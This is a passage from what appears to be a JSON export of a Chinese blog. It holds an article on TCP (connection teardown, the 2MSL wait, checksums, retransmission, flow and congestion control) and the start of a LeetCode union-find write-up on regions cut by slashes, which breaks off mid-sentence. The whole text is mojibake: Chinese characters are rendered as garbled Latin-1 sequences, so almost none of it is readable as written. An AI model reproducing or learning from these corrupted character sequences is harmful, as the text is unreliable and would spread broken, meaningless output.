è¾“å®Œæ¯•ä¹‹ååŒæ–¹æ–­å¼€è¿æ¥ï¼Œè€Œæ­¤æ—¶ï¼Œå‰ä¸€ä¸ªæ»ç•™åœ¨ç½‘ç»œä¸­çš„è¿æ¥è¯·æ±‚åˆ°è¾¾æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨è®¤ä¸ºå®¢æˆ·æœºåˆè¯·æ±‚å»ºç«‹è¿æ¥ã€‚æ­¤æ—¶ï¼Œå¦‚æœä½¿ç”¨ä¸¤æ¬¡æ¡æ‰‹ï¼ŒæœåŠ¡å™¨è®¤ä¸ºè¿æ¥å»ºç«‹ï¼Œè€Œå®¢æˆ·æœºå®é™…ä¸Šå¹¶æ²¡æœ‰å‘èµ·è¿æ¥è¯·æ±‚ï¼Œå› æ­¤ä¸äºˆç†ç¬ï¼Œé€ æˆäº†æœåŠ¡å™¨èµ„æºçš„æµªè´¹ã€‚\næ•°æ®ä¼ è¾“å®Œæˆä¹‹åï¼Œéœ€è¦æ–­å¼€è¿æ¥ã€‚å¦‚æœä½ æœ‰æ³¨æ„åˆ°ä¸Šå›¾ä¸­çš„FINæŠ¥æ–‡æ®µï¼Œéœ€è¦ç•™å¿ƒï¼Œé‚£åªæ˜¯ä¸ªæ–­å¼€è¿æ¥çš„ç¤ºæ„ï¼Œå…¶ä¸­å¹¶æ²¡æœ‰å±•ç°â€œå››æ¬¡æŒ¥æ‰‹â€çš„è¿‡ç¨‹ã€‚\nè€ŒçœŸæ­£çš„â€œå››æ¬¡æŒ¥æ‰‹â€è¿‡ç¨‹å¦‚ä¸‹å›¾ï¼š\nTCP å››æ¬¡æŒ¥æ‰‹ ç¬¬ä¸€æ­¥ï¼šå®¢æˆ·æœºæ‰“ç®—å…³é—­è¿æ¥æ—¶ï¼Œå‘æœåŠ¡å™¨å‘é€ä¸€ä¸ªè¿æ¥é‡Šæ”¾æŠ¥æ–‡æ®µï¼Œå…¶ä¸­FINæ ‡å¿—ä½è®¾ç½®ä¸º1,åŒæ ·å ç”¨ä¸€ä¸ªåºå·å³seq=xï¼ˆè¿™é‡Œçš„xä¸ä¹‹å‰ä¸‰æ¬¡æ¡æ‰‹çš„xæ— å…³ï¼Œåªæ˜¯ä¸€ç§è¡¨ç¤ºï¼‰ã€‚æ­¤æ—¶å‘é€FINçš„ä¸€ç«¯ä¸èƒ½å†å‘é€æ•°æ®ï¼Œä½†å¯ä»¥å‘é€æ§åˆ¶ä¿¡æ¯ï¼Œå¯ä»¥æ¥æ”¶æ•°æ®ã€‚ ç¬¬äºŒæ­¥ï¼šæœåŠ¡å™¨æ”¶åˆ°è¿æ¥é‡Šæ”¾æŠ¥æ–‡æ®µä¹‹åå‘å‡ºç¡®è®¤ã€‚æ­¤æ—¶å®¢æˆ·æœºåˆ°æœåŠ¡å™¨æ–¹å‘çš„è¿æ¥å°±é‡Šæ”¾äº†ï¼Œä½†æœåŠ¡å™¨è¿˜èƒ½å‘é€æ•°æ®ï¼Œå®¢æˆ·æœºä»è¦æ¥æ”¶ã€‚ ç¬¬ä¸‰æ­¥ï¼šæœåŠ¡å™¨æ•°æ®ä¹Ÿå‘é€å®Œæ¯•ï¼Œå‘å®¢æˆ·æœºå‘å‡ºFIN=1çš„æŠ¥æ–‡æ®µã€‚ ç¬¬å››æ­¥ï¼šå®¢æˆ·æœºæ”¶åˆ°è¿æ¥é‡Šæ”¾æŠ¥æ–‡æ®µåï¼Œå‘å‡ºç¡®è®¤ã€‚å‘å‡ºç¡®è®¤åè¿æ¥è¿˜æ²¡æœ‰é‡Šæ”¾ï¼Œå¿…é¡»ç­‰å¾…è®¡æ—¶å™¨è®¾ç½®çš„æ—¶é—´2MSLåæ‰è¿›å…¥å…³é—­çŠ¶æ€ã€‚ ç­‰å¾…2MSLçš„å¿…è¦æ€§ï¼š\nç¬¬å››æ­¥ä¸­å®¢æˆ·æœºå‘å‡ºACKä¹‹åéœ€è¦ç­‰å¾…2MSLæ‰è¿›å…¥å…³é—­çŠ¶æ€ã€‚MSLï¼ˆMaximum Segment Lifeï¼‰æ˜¯æŒ‡ä¸€ä¸ªæŠ¥æ–‡æ®µåœ¨ç½‘ç»œä¸­å­˜ç•™çš„æœ€é•¿æ—¶é—´ã€‚ç­‰å¾…çš„ç›®çš„æ˜¯ä¸ºäº†ä¿è¯æœåŠ¡å™¨æ”¶åˆ°è‡ªå·±çš„ACKã€‚\nåœ¨ç¬¬ä¸‰æ­¥ä¸­ï¼ŒæœåŠ¡å™¨å‘å‡ºäº†FINï¼Œä½†æ˜¯æ­¤æ—¶å¹¶ä¸èƒ½é‡Šæ”¾æ­¤æ¬¡è¿æ¥çš„èµ„æºï¼Œè€Œè¦ç¡®ä¿å®¢æˆ·æœºæ”¶åˆ°äº†è‡ªå·±çš„FINã€‚\nå®¢æˆ·æœºåœ¨ç¬¬å››æ­¥å‘å‡ºçš„ACKåªæœ‰ä»¥ä¸‹ä¸¤ç§æƒ…å†µï¼š\nå®¢æˆ·æœºå‘å‡ºçš„ACKåˆ°è¾¾äº†æœåŠ¡å™¨ï¼Œåˆ™æœåŠ¡å™¨è®¤ä¸ºè¿æ¥å…³é—­ï¼Œç«‹å³é‡Šæ”¾èµ„æºï¼› å®¢æˆ·æœºå‘å‡ºçš„ACKæ²¡æœ‰åˆ°è¾¾æœåŠ¡å™¨ï¼Œé‚£ä¹ˆæœåŠ¡å™¨çŸ¥é“è‡ªå·±çš„FINæ²¡æœ‰è¢«æ”¶åˆ°ï¼Œåº”è¯¥è¶…æ—¶é‡ä¼ ã€‚ æ˜¾ç„¶ï¼Œåœ¨ç¬¬äºŒç§æƒ…å†µä¸­ï¼Œå¦‚æœæœåŠ¡å™¨è¿›è¡Œäº†FINçš„é‡ä¼ ï¼Œè€Œå®¢æˆ·æœºåœ¨å‘å‡ºACKä¹‹åå°±å…ˆè¡Œé‡Šæ”¾äº†èµ„æºï¼Œé‚£å°±é€ æˆäº†é”™è¯¯ã€‚\näºæ˜¯ï¼Œå®¢æˆ·æœºåœ¨å‘å‡ºACKåç­‰å¾…2MSLçš„æ—¶é—´ï¼š\n2MSL = è‡ªå·±çš„ACKçš„æœ€å¤§å­˜æ´»æ—¶é—´ + é‡ä¼ çš„FINçš„æœ€å¤§å­˜æ´»æ—¶é—´\nç®€è€Œè¨€ä¹‹ï¼Œåœ¨ç¬¬å››æ­¥å‘å‡ºACKä¹‹åï¼Œå¦‚æœACKæ²¡æœ‰åˆ°è¾¾ï¼Œé‚£ä¹ˆåœ¨2MSLæ—¶é—´å†…ä¸€å®šèƒ½æ”¶åˆ°å¯¹æ–¹é‡ä¼ çš„FINï¼Œä»è€Œå¯ä»¥ç»§ç»­å“åº”ACKï¼›è‹¥2MSLæ—¶é—´å†…éƒ½æ²¡æœ‰æ”¶åˆ°ä»»ä½•ä¿¡æ¯ï¼Œé‚£ä¹ˆè‡ªå·±çš„ACKä¸€å®šå·²ç»åˆ°è¾¾ï¼Œè¿æ¥å¯ä»¥æ­£å¸¸å…³é—­ã€‚\nTCPå¯é ä¼ è¾“\nTCPçš„ä»»åŠ¡æ˜¯åœ¨IPå±‚ä¸å¯é çš„ã€å°½åŠ›è€Œä¸ºæœåŠ¡çš„åŸºç¡€ä¸Šå»ºç«‹ä¸€ç§å¯é æ•°æ®ä¼ è¾“æœåŠ¡ï¼Œå…¶ä½¿ç”¨äº†æ ¡éªŒã€åºå·ã€ç¡®è®¤å’Œé‡ä¼ ç­‰æœºåˆ¶æ¥è¾¾åˆ°è¿™ä¸€ç›®çš„ã€‚\næ ¡éªŒ\nTCPçš„æ ¡éªŒæœºåˆ¶å’ŒUDPæ˜¯ä¸€æ ·çš„ã€‚è®¡ç®—æ ¡éªŒå’Œæ—¶è¦åœ¨TCP/UDPæ•°æ®æŠ¥ä¹‹å‰å¢åŠ 12Bçš„ä¼ªé¦–éƒ¨ï¼Œä¼ªé¦–éƒ¨å¹¶ä¸æ˜¯çœŸæ­£çš„æ•°æ®æŠ¥é¦–éƒ¨ï¼Œä¸å®é™…å‘é€ï¼Œåªæ˜¯å‚ä¸æ ¡éªŒå’Œçš„è®¡ç®—è€Œå·²ã€‚æ·»åŠ äº†ä¼ªé¦–éƒ¨ä¹‹åçš„æ•°æ®æŠ¥å¦‚ä¸‹ï¼š\næ·»åŠ ä¼ªé¦–éƒ¨çš„ä¸´æ—¶æ•°æ®æŠ¥ æ ¡éªŒå’Œçš„è®¡ç®—æ–¹æ³•æ˜¯ï¼šå°†ä¸´æ—¶æ•°æ®æŠ¥è§†ä¸ºè®¸å¤š16ä½çš„å­—é“¾æ¥èµ·æ¥ï¼Œæœ«å°¾ä¸è¶³åˆ™ç”¨0å¡«å……ã€‚ä½¿ç”¨äºŒè¿›åˆ¶åç è®¡ç®—å‡ºè¿™äº›16ä½å­—çš„å’Œï¼Œå¹¶å°†æ­¤å’Œçš„äºŒè¿›åˆ¶åç å†™å…¥çœŸæ­£æ•°æ®æŠ¥å¤´éƒ¨çš„æ ¡éªŒä½å­—æ®µã€‚\nåºå·\nTCPé¦–éƒ¨çš„åºå·å­—æ®µç”¨æ¥ä¿è¯æ•°æ®èƒ½æœ‰åºæäº¤ç»™åº”ç”¨å±‚ï¼ŒTCPæŠŠæ•°æ®è§†ä¸ºä¸€ä¸ªæ— ç»“æ„ä½†æœ‰åºçš„å­—èŠ‚æµï¼Œåºå·å»ºç«‹åœ¨ä¼ é€çš„å­—èŠ‚æµä¹‹ä¸Šï¼Œè€Œä¸å»ºç«‹åœ¨æŠ¥æ–‡æ®µä¹‹ä¸Šã€‚\nTCPè¿æ¥ä¼ é€çš„æ•°æ®æµä¸­æ¯ä¸ªå­—èŠ‚éƒ½ç¼–ä¸Šä¸€ä¸ªåºå·ã€‚åºå·å­—æ®µçš„å€¼æ˜¯æœ¬æŠ¥æ–‡æ®µæ‰€å‘é€çš„æ•°æ®çš„ç¬¬ä¸€ä¸ªå­—èŠ‚çš„åºå·ã€‚ä¾‹å¦‚ä¸€æ®µæ•°æ®æœ‰10ä¸ªå­—èŠ‚ï¼Œåˆ†ä¸¤ä¸ªæ•°æ®æŠ¥ä¼ é€ï¼Œç¬¬ä¸€ä¸ªæ•°æ®æŠ¥åºå·ä¸º0ï¼ŒåŒ…å«0~5ä¸ªå­—èŠ‚ï¼Œåˆ™ç¬¬äºŒä¸ªæ•°æ®æŠ¥çš„åºå·ä¸º6ã€‚\nç¡®è®¤\nTCPé¦–éƒ¨çš„ç¡®è®¤å·æ˜¯æœŸæœ›æ”¶åˆ°å¯¹æ–¹çš„ä¸‹ä¸€ä¸ªæŠ¥æ–‡åºå·ã€‚æŒ‰ç…§ä¸Šé¢çš„ä¾‹å­ï¼Œå¦‚æœå¯¹æ–¹æ”¶åˆ°äº†ç¬¬ä¸€ä¸ªæ•°æ®æŠ¥ï¼ˆåºå·0ï¼ŒåŒ…å«0~5ä¸ªå­—èŠ‚ï¼‰ï¼Œåˆ™è¿”å›çš„ack=6ã€‚\nTCPé»˜è®¤ä½¿ç”¨ç´¯è®¡ç¡®è®¤ï¼Œå³TCPåªç¡®è®¤æ•°æ®æµä¸­è‡³ç¬¬ä¸€ä¸ªä¸¢å¤±å­—èŠ‚ä¸ºæ­¢çš„å­—èŠ‚ã€‚\né‡ä¼ \né‡ä¼ å¯¹äºæ‹¥å¡æ§åˆ¶æ˜¯æ¯”è¾ƒé‡è¦çš„æœºåˆ¶ã€‚æœ‰ä¸¤ç§äº‹ä»¶ä¼šå¯¼è‡´TCPå¯¹æŠ¥æ–‡è¿›è¡Œé‡ä¼ ï¼šè¶…æ—¶å’Œå†—ä½™ACKã€‚\nè¶…æ—¶\nTCPæ¯å‘é€ä¸€ä¸ªæŠ¥æ–‡æ®µï¼Œå°±è¦å¯¹è¿™ä¸ªæŠ¥æ–‡æ®µè®¾ç½®ä¸€æ¬¡è®¡æ—¶å™¨ã€‚è®¡æ—¶å™¨è¶…æ—¶åè¦å¯¹è¿™ä¸ªæŠ¥æ–‡è¿›è¡Œé‡ä¼ ã€‚\nç”±äºTCPçš„ä¸‹å±‚æ˜¯ä¸€ä¸ªäº’è”ç½‘ç¯å¢ƒï¼ŒIPæ•°æ®æŠ¥æ‰€é€‰æ‹©çš„è·¯ç”±å˜åŒ–æ—¶åˆ»å½±å“ä¼ è¾“å±‚çš„å¾€è¿”æ—¶å»¶ã€‚TCPçš„è¶…æ—¶é‡ä¼ æ—¶é—´åŸºäºå‘é€æ–¹æµ‹é‡å¾—åˆ°çš„å¹³å‡å¾€è¿”æ—¶é—´ï¼Œå…·ä½“ç»†èŠ‚ä¸åœ¨æœ¬æ–‡è®¨è®ºèŒƒå›´å†…ã€‚\nå†—ä½™ACK\nè¶…æ—¶é‡ä¼ å­˜åœ¨çš„é—®é¢˜æ˜¯æ˜¾ç„¶çš„ï¼šå‘¨æœŸå¤ªé•¿ã€‚è€Œå†—ä½™ACKä½¿å¾—å‘é€æ–¹å¯ä»¥åœ¨è¶…æ—¶ä¹‹å‰æ³¨æ„åˆ°ä¸¢åŒ…ç°è±¡çš„å­˜åœ¨ã€‚å†—ä½™ACKå°±æ˜¯å†æ¬¡ç¡®è®¤æŸä¸ªæŠ¥æ–‡æ®µçš„ACKï¼Œè€Œå‘é€æ–¹å…ˆå‰å·²ç»æ”¶åˆ°è¿‡è¯¥æŠ¥æ–‡æ®µçš„ç¡®è®¤ã€‚ä¾‹å¦‚ï¼Œå‘é€æ–¹Aå‘é€äº†åºå·ä¸º1/3/5/7/9çš„æŠ¥æ–‡æ®µï¼Œè€Œ3å·æŠ¥æ–‡åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­ä¸¢å¤±ã€‚å¯¹äºæ¥æ”¶æ–¹Bï¼Œå®ƒæ”¶åˆ°1å·æŠ¥æ–‡åæ¥ä¸‹æ¥éœ€è¦çš„æ˜¯3å·æŠ¥æ–‡ï¼Œè€Œæ”¶åˆ°5å·ã€7å·ã€9å·æŠ¥æ–‡ä¹‹åå‘ç°è¿™äº›æŠ¥æ–‡å¹¶ä¸æ˜¯å½“å‰éœ€è¦çš„æŠ¥æ–‡ï¼Œäºæ˜¯å‘é€3ä¸ªå¯¹3å·æŠ¥æ–‡çš„ACKã€‚TCPè§„å®šå½“å‘é€æ–¹æ”¶åˆ°å¯¹åŒä¸€ä¸ªæŠ¥æ–‡çš„3ä¸ªå†—ä½™ACKæ—¶ï¼Œå°±å¯ä»¥è®¤ä¸ºè·Ÿåœ¨è¿™ä¸ªè¢«ç¡®è®¤æŠ¥æ–‡æ®µä¹‹åçš„æŠ¥æ–‡æ®µå·²ç»ä¸¢å¤±ã€‚\nTCPæµé‡æ§åˆ¶\næ³¨æ„æµé‡æ§åˆ¶å’Œæ‹¥å¡æ§åˆ¶çš„æœ¬è´¨åŒºåˆ«ï¼šæµé‡æ§åˆ¶æ˜¯æŒ‡ç‚¹å¯¹ç‚¹çš„é€šä¿¡é‡çš„æ§åˆ¶ï¼Œå…¶æ ¹æœ¬ç›®çš„æ˜¯ä½¿å‘é€æ–¹çš„å‘é€é€Ÿç‡å’Œæ¥æ”¶æ–¹çš„æ¥æ”¶é€Ÿç‡åŒ¹é…ï¼›æ‹¥å¡æ§åˆ¶æ˜¯è®©ç½‘ç»œèƒ½å¤Ÿæ‰¿æ‹…ç°æœ‰çš„ç½‘ç»œè´Ÿè·ï¼Œæ˜¯ä¸€ä¸ªå…¨å±€æ€§çš„è¿‡ç¨‹ï¼Œæ¶‰åŠæ‰€æœ‰çš„ä¸»æœºã€æ‰€æœ‰çš„è·¯ç”±å™¨ï¼Œä»¥åŠä¸é™ä½ç½‘ç»œä¼ è¾“æ€§èƒ½æœ‰å…³çš„æ‰€æœ‰å› ç´ ã€‚\nTCPçš„å‘é€ç«¯å’Œæ¥æ”¶ç«¯éƒ½ç»´æŠ¤å‘é€çª—å£å’Œæ¥æ”¶çª—å£ï¼Œæ¥æ”¶æ–¹å¯ä»¥è®¾ç½®TCPå¤´éƒ¨çš„çª—å£å­—æ®µæ¥å‘Šè¯‰å‘é€æ–¹è‡ªå·±çš„çª—å£å¤§å°ï¼Œä½¿å‘é€æ–¹å¯¹å‘é€çª—å£è¿›è¡ŒåŠ¨æ€è°ƒæ•´ã€‚\nTCPæ‹¥å¡æ§åˆ¶\nå‘é€æ–¹é™¤äº†ä½¿è‡ªå·±å‘é€çš„æ•°æ®èƒ½å¤Ÿå»åˆæ¥æ”¶ç«¯çš„æ¥æ”¶é€Ÿç‡ä¹‹å¤–ï¼Œè¿˜éœ€è¦è€ƒè™‘è‡ªå·±çš„å‘é€é€Ÿç‡å¯¹ç½‘ç»œçš„å½±å“ã€‚å½“ç½‘ç»œè´Ÿè½½è¾ƒå¤§çš„æ—¶å€™ï¼Œå‘é€é€Ÿç‡åº”è¯¥å‡å°ï¼Œä»¥å…åŠ é‡ç½‘ç»œçš„è´Ÿè½½ã€‚\nå› æ­¤ï¼Œå‘é€æ–¹éœ€è¦ç»´æŠ¤ä»¥ä¸‹ä¸¤ä¸ªçª—å£ï¼š\næ¥å—çª—å£rwndï¼Œåæ˜ æ¥æ”¶æ–¹çš„å®¹é‡ï¼› æ‹¥å¡çª—å£cwndï¼Œæ ¹æ®è‡ªå·±ä¼°ç®—çš„ç½‘ç»œæ‹¥å¡ç¨‹åº¦è®¾ç½®çš„çª—å£å€¼ï¼Œåæ˜ ç½‘ç»œçš„å½“å‰å®¹é‡ã€‚ æ˜¾ç„¶ï¼ŒçœŸæ­£çš„å‘é€çª—å£å¤§å° = min(rwnd, cwnd)ã€‚\nä¸ºäº†æ›´å¥½åœ°å¯¹ä¼ è¾“å±‚è¿›è¡Œæ‹¥å¡æ§åˆ¶ï¼Œå› ç‰¹ç½‘å»ºè®®æ ‡å‡†å®šä¹‰äº†4ç§ç®—æ³•ï¼šæ…¢å¯åŠ¨ã€æ‹¥å¡é¿å…ã€å¿«é‡ä¼ ã€å¿«æ¢å¤ã€‚\næ…¢å¯åŠ¨\nåœ¨TCPåˆšåˆšè¿æ¥å¥½å¹¶å¼€å§‹å‘é€TCPæŠ¥æ–‡æ®µæ—¶ï¼Œå…ˆä»¤æ‹¥å¡çª—å£cwnd = 1ï¼Œå³åˆšå¼€å§‹æ—¶åªèƒ½å‘é€ä¸€ä¸ªæœ€å¤§æŠ¥æ–‡æ®µï¼ˆMSSï¼‰ã€‚\næ¯ç»è¿‡ä¸€ä¸ªä¼ è¾“è½®æ¬¡ï¼ˆç»è¿‡ä¸€æ¬¡å¾€è¿”æ—¶å»¶RTTä¹‹åï¼‰ï¼Œæ‹¥å¡çª—å£åŠ å€ï¼Œåœ¨è¿™ç§ç®—æ³•ä¸‹cwndçš„å¤§å°æŒ‡æ•°å¼å¢é•¿ã€‚æˆ‘ä»¬ä»ä¸€å¼€å§‹å°±éœ€è¦è§„å®šä¸€ä¸ªæ…¢å¼€å§‹é—¨é™ssthreshï¼Œå³é˜ˆå€¼ï¼Œæ‹¥å¡çª—å£å¤§å°ä¸€ç›´æŒ‡æ•°å¢é•¿åˆ°è¿™ä¸ªé˜ˆå€¼ä¹‹åï¼Œæ”¹ç”¨æ‹¥å¡é¿å…ç®—æ³•ã€‚\næ‹¥å¡é¿å…ç®—æ³•\næ‹¥å¡é¿å…ç®—æ³•è¦æ±‚ï¼š\nå‘é€ç«¯çš„æ‹¥å¡çª—å£cwndæ¯ç»è¿‡ä¸€ä¸ªå¾€è¿”æ—¶å»¶RTTå°±å¢åŠ ä¸€ä¸ªMSSçš„å¤§å°ã€‚åœ¨è¿™ç§ç®—æ³•ä¸‹cwndæŒ‰çº¿æ€§è§„å¾‹ç¼“æ…¢å¢é•¿ï¼ˆåŠ æ³•å¢å¤§ï¼‰ï¼› æ¯å½“å‡ºç°ä¸€æ¬¡è¶…æ—¶ï¼Œä»¤æ…¢å¼€å§‹é—¨é™ï¼ˆé˜ˆå€¼ï¼‰ç­‰äºå½“å‰cwndçš„ä¸€åŠï¼ˆä¹˜æ³•å‡å°ï¼‰ï¼Œç„¶åå°†cwndè®¾ç½®ä¸º1ï¼Œé‡æ–°æ…¢å¯åŠ¨ã€‚ æ…¢å¯åŠ¨å’Œæ‹¥å¡é¿å…çš„å®ç°è¿‡ç¨‹å¦‚ä¸‹ï¼š\næ…¢å¯åŠ¨å’Œæ‹¥å¡é¿å… æ³¨æ„åœ¨æ…¢å¼€å§‹ï¼ˆæŒ‡æ•°å¢é•¿ï¼‰é˜¶æ®µï¼Œè‹¥2 * cwnd \u0026gt; ssthreshï¼Œåˆ™ä¸‹ä¸€ä¸ªRTTçš„cwnd ç­‰äºssthreshï¼›å³cwndä¸èƒ½è·ƒè¿‡ssthreshå€¼ã€‚\nå¿«é‡ä¼ \nå…ˆå‰æè¿‡ï¼Œå‘é€ç«¯æ”¶åˆ°è¿ç»­ä¸‰ä¸ªå†—ä½™ACKæ—¶ï¼Œå°±èƒ½è¿›è¡Œé‡ä¼ ï¼Œè€Œä¸å¿…ç­‰å¾…è®¡æ—¶å™¨è¶…æ—¶ã€‚æ­¤å³â€œå¿«é‡ä¼ â€ã€‚\nå¿«æ¢å¤\nå¿«æ¢å¤æ˜¯ä¸ºäº†é…åˆå¿«é‡ä¼ è€Œå®šä¹‰çš„ç®—æ³•ã€‚å®ƒè§„å®šï¼šå‘é€ç«¯æ”¶åˆ°è¿ç»­ä¸‰ä¸ªå†—ä½™ACKæ—¶æ‰§è¡Œâ€œä¹˜æ³•å‡å°â€ç®—æ³•ï¼Œå³å°†æ…¢å¼€å§‹é—¨é™è®¾ç½®ä¸ºæ­¤æ—¶cwndçš„ä¸€åŠï¼Œç„¶åæŠŠcwndçš„å€¼è®¾ç½®ä¸ºæ”¹å˜åçš„é˜ˆå€¼ï¼Œç›´æ¥è¿›è¡ŒåŠ æ³•å¢é•¿ã€‚\næ˜¾ç„¶ï¼Œå¿«æ¢å¤ä¸éœ€è¦cwndä»1å¼€å§‹æ—¶çš„æ…¢å¯åŠ¨è¿‡ç¨‹ï¼Œæ‰€ä»¥å®ƒæ¯”è¾ƒâ€œå¿«â€ã€‚\nä¸¤ç§ç®—æ³•å®ç°çš„æ¯”è¾ƒå¦‚ä¸‹ï¼š\nå¿«æ¢å¤ç®—æ³•çš„å®ç°è¿‡ç¨‹ ä¸ºä»€ä¹ˆå¿«é‡ä¼ è¦æ­é…å¿«æ¢å¤ï¼Ÿ\nåœ¨æ‹¥å¡é¿å…ç®—æ³•ä¸­ï¼Œé‡ä¼ çš„æƒ…å†µæ˜¯è®¡æ—¶å™¨è¶…æ—¶ï¼Œè¯´æ˜æ­¤æ—¶ä¸ç®¡æ˜¯è‡ªå·±çš„æ•°æ®æŠ¥è¿˜æ˜¯å¯¹æ–¹çš„ACKéƒ½å·²ç»æ— æ³•é€è¾¾ï¼Œç½‘ç»œçš„è´Ÿè½½å·²ç»å¾ˆå¤§ï¼Œç›´æ¥å°†è‡ªå·±çš„æ‹¥å¡çª—å£å‡æˆ1ï¼Œæ˜¯ä¸€ç§æ¯”è¾ƒé«˜æ•ˆçš„é™æµæªæ–½ï¼›\nåœ¨å¿«é‡ä¼ æƒ…å†µä¸‹ï¼Œèƒ½å¤Ÿæ”¶åˆ°ä¸‰æ¬¡å†—ä½™ACKï¼Œè¯´æ˜ç½‘ç»œä¸­è¿˜æ˜¯èƒ½å¤Ÿé€šè¿‡ä¸€äº›æ•°æ®æŠ¥çš„ï¼Œæ­¤æ—¶å°†æ‹¥å¡çª—å£å‡åŠï¼Œç›´æ¥å¼€å§‹æ‹¥å¡é¿å…ç®—æ³•ï¼ˆåŠ æ³•å¢é•¿ï¼‰ï¼Œå¯¹æ€§èƒ½çš„å½±å“è¾ƒå°ã€‚\nå°ç»“ æœ¬æ–‡å¯¹é‡è¦çš„ä¼ è¾“å±‚åè®®â€”â€”TCPè¿›è¡Œäº†è¾ƒä¸ºå…¨é¢çš„æ¢³ç†ï¼ŒåŒ…æ‹¬TCPæŠ¥æ–‡æ®µæ ¼å¼ã€TCPè¿æ¥ç®¡ç†ã€TCPå¯é ä¼ è¾“ã€æµé‡æ§åˆ¶å’Œæ‹¥å¡æ§åˆ¶ã€‚\næœ¬æ–‡å¤šæ•°å†…å®¹æ¥è‡ªå‚è€ƒèµ„æ–™[2]ï¼Œå°‘æ•°å†…å®¹æ¥è‡ªç½‘ç»œï¼Œå¯¹éƒ¨åˆ†çŸ¥è¯†ç‚¹è¿›è¡Œäº†è¡¥å……ã€‚å‚è€ƒèµ„æ–™éš¾å…ä¸å¤Ÿå…¨é¢ï¼Œå¯¹æœ¬æ–‡ä¸­çš„å†…å®¹æœ‰ä»»ä½•ç–‘é—®å¤„è¯·åœ¨è¯„è®ºåŒºç•™è¨€ã€‚\nå‚è€ƒèµ„æ–™ [1] è½¦å°èƒ–.ä¸ºä»€ä¹ˆTCP4æ¬¡æŒ¥æ‰‹æ—¶ç­‰å¾…ä¸º2MSLï¼Ÿ[EB/OL].2017-10-23\nhttps://www.zhihu.com/question/67013338\n[2] ç‹é“è®ºå›.2021å¹´è®¡ç®—æœºç½‘ç»œè€ƒç ”å¤ä¹ æŒ‡å¯¼[M].åŒ—äº¬:ç”µå­å·¥ä¸šå‡ºç‰ˆç¤¾,2020:209-246\n[3] æå“èˆª.TCPçš„ä¸‰æ¬¡æ¡æ‰‹ä¸å››æ¬¡æŒ¥æ‰‹ç†è§£åŠé¢è¯•é¢˜ï¼ˆå¾ˆå…¨é¢ï¼‰[EB/OL].2019-06-29\nhttps://www.cnblogs.com/bj-mr-li/p/11106390.html\n[4] å°ç‹¼çš„ä¸–ç•Œ.Wiresharkä½¿ç”¨å…¥é—¨[EB/OL].2019-06-23\nhttps://www.cnblogs.com/cocowool/p/wireshark_tcp_http.html\n[5] sean-zou.TCPæŠ¥æ–‡æ ¼å¼[EB/OL].2014-06-10\nhttps://blog.csdn.net/a19881029/article/details/29557837\n","date":"2021-01-27T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E4%BC%A0%E8%BE%93%E5%B1%82%E5%8D%8F%E8%AE%AEtcp/","title":"ä¼ è¾“å±‚åè®®â€”â€”TCP"},{"content":"é¢˜ç›®é“¾æ¥ï¼šhttps://leetcode-cn.com/problems/regions-cut-by-slashes/\nä»¤æˆ‘æ€è€ƒå¾ˆä¹…çš„ä¸€é“é¢˜ï¼Œæœ€åè¿˜æ˜¯å­¦ç€å®˜æ–¹é¢˜è§£åšå‡ºæ¥çš„([1])ã€‚æ€è€ƒè¿‡ç¨‹ä¸­ä¹Ÿæƒ³è¿‡å¹¶æŸ¥é›†ï¼Œç„¶è€Œå¹¶æ²¡æœ‰æƒ³åˆ°é¢˜è§£ä¸­çš„åšæ³•ï¼›æƒ³åˆ°è¿‡æ±‚ä¸€ä¸ªå›¾ä¸­ç¯è·¯çš„ä¸ªæ•°ï¼Œç„¶è€Œä¸ä¼šã€‚\né¢˜ç›® åœ¨ç”± 1 x 1 æ–¹æ ¼ç»„æˆçš„ N x N ç½‘æ ¼ grid ä¸­ï¼Œæ¯ä¸ª 1 x 1 æ–¹å—ç”± /ã€\\ æˆ–ç©ºæ ¼æ„æˆã€‚è¿™äº›å­—ç¬¦ä¼šå°†æ–¹å—åˆ’åˆ†ä¸ºä¸€äº›å…±è¾¹çš„åŒºåŸŸã€‚\nï¼ˆè¯·æ³¨æ„ï¼Œåæ–œæ å­—ç¬¦æ˜¯è½¬ä¹‰çš„ï¼Œå› æ­¤ \\ ç”¨ \u0026ldquo;\\\\\u0026rdquo; è¡¨ç¤ºã€‚ï¼‰ã€‚\nè¿”å›åŒºåŸŸçš„æ•°ç›®ã€‚\nåˆ†æ å°†å•å…ƒæ ¼è¿›ä¸€æ­¥ç»†åˆ†ï¼Œä¾¿äºå¹¶æŸ¥é›†æ“ä½œã€‚\næ¯ä¸ªå•å…ƒæ ¼å¯¹è§’ç‚¹äº’è¿ï¼Œå³å¯åˆ†æˆå››ä¸ªå°ä¸‰è§’å½¢ï¼ˆå›¾1ï¼‰ï¼Œæ ¹æ®æœ¬æ ¼ä¸­çš„å­—ç¬¦æ˜¯/è¿˜æ˜¯\\ï¼Œåˆå¹¶ä¸åŒçš„å°ä¸‰è§’å½¢ã€‚\nå›¾1. å•å…ƒæ ¼åˆ’åˆ† æ ¼å†…åˆå¹¶\nå½“æœ¬æ ¼å­—ç¬¦ä¸ºç©ºæ ¼æ—¶ï¼Œæ‰€æœ‰å°ä¸‰è§’å½¢å¤„äºåŒä¸€ä¸ªåŒºåŸŸä¸­ï¼Œå…¨éƒ¨åˆå¹¶ï¼› å½“æœ¬æ ¼å­—ç¬¦ä¸º/æ—¶ï¼Œåˆå¹¶0å·å’Œ3å·ï¼Œåˆå¹¶1å·å’Œ2å·ï¼Œä¸”è¿™ä¸¤ä¸ªåŒºåŸŸä¸äº’é€šï¼› å½“æœ¬æ ¼å­—ç¬¦ä¸º\\æ—¶ï¼Œåˆå¹¶0å·å’Œ1å·ï¼Œåˆå¹¶3å·å’Œ2å·ï¼Œä¸”è¿™ä¸¤ä¸ªåŒºåŸŸä¸äº’é€šã€‚ æ ¼é—´åˆå¹¶\næ ¼é—´åˆå¹¶æ˜¯æŒ‡å•å…ƒæ ¼ä¹‹é—´çš„å°ä¸‰è§’å½¢åˆå¹¶ã€‚æ— è®ºæœ¬å•å…ƒæ ¼ä¸­çš„å­—ç¬¦æ˜¯ä»€ä¹ˆï¼Œå½“å‰å•å…ƒæ ¼çš„1å·ä¸‰è§’å½¢å’Œå³è¾¹å•å…ƒæ ¼çš„3å·æ°¸è¿œå¤„äºåŒä¸€ä¸ªåŒºåŸŸï¼Œå½“å‰å•å…ƒæ ¼çš„2å·å’Œä¸‹è¾¹å•å…ƒæ 